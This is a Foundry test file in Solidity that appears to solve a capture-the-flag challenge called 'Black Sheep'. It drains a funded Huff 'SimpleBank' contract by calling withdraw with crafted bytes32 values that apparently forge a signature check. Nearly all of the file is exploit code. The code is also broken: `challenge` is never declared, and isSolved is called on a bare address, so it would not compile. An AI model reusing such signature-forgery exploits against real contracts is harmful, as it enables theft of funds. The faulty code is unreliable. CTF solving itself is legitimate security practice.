// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "foundry-huff/HuffConfig.sol";
import "./Challenge.sol";
import "./ISimpleBank.sol";

contract BlackSheepSolve is Test {

    constructor() payable {
    }

    function testExploit() public {
        HuffConfig config = new HuffConfig();
        ISimpleBank bank = ISimpleBank(config.deploy("SimpleBank"));
        payable(address(bank)).transfer(10 ether);
        challenge = address(new Challenge(bank));

        // vm.createSelectFork(vm.rpcUrl("paradigm"));
        // Challenge challenge = Challenge(0xE99e1265eee1FeFdAb421faEAc9495e5018147c9);
        assertEq(challenge.isSolved(), false);
        // ISimpleBank bank = challenge.BANK();
        bank.withdraw(bytes32(0x42fe1f9f1e04256bf90462200545ce3f96a28e77b3f338f2dc13193a12776439), 0xa0, bytes32(0xc43e9fa526d173e9c8880fa0fdc03b4d4583a49de2f0b9d6265f947c8e6a062b), bytes32(0x3e2824a5eed3639210517b7cbc837e7a4ccd010e8da1a229e36d91433500991c));
        assertEq(challenge.isSolved(), true);
    }
}
